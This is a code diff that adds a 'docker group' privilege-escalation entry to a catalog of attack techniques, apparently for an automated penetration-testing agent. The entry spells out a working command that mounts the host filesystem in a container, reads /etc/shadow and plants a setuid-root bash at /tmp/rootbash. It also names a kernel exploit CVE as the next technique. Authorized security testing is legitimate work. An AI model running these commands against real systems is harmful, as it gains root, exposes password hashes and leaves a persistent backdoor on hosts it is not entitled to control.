@@ -173,6 +173,23 @@ _PERSISTENCE: list[Technique] = [
 # =============================================================================
 
 _PRIVILEGE_ESCALATION: list[Technique] = [
+    # docker-group first: when the foothold user is in the `docker` group it is a
+    # near-certain root vector (daemon runs as root -> mount host FS in a
+    # container). The privesc stage prefers it over suid/sudo/kernel. `requires`
+    # is advisory; feasibility is confirmed from `id`/`groups` at runtime
+    # (stages.privesc._user_in_docker_group).
+    Technique(id="T1611", slug="docker_group", tactic="privilege_escalation",
+              name="Escape to Host (docker group / container breakout)",
+              min_privilege="user", requires=("docker_group",),
+              procedure_hint="NON-INTERACTIVE only (command_shell hangs on `-it`). "
+                             "Discover a local image (`docker images -q | head -n1`; "
+                             "if none, `docker pull busybox`), then run one `--rm` "
+                             "container that mounts and chroots the host FS to act as "
+                             "root: `IMG=$(docker images -q | head -n1); docker run -v "
+                             "/:/mnt --rm $IMG chroot /mnt sh -c 'id; head -1 "
+                             "/etc/shadow; cp /bin/bash /mnt/tmp/rootbash; chmod 4755 "
+                             "/mnt/tmp/rootbash'`. Prove root from the session with "
+                             "`/tmp/rootbash -p -c id` (expect euid=0(root))."),
     Technique(id="T1068", slug="kernel_exploit", tactic="privilege_escalation",
               name="Exploitation for Privilege Escalation", min_privilege="user",
               procedure_hint="Kernel/local exploit (e.g. overlayfs CVE-2015-1328, "
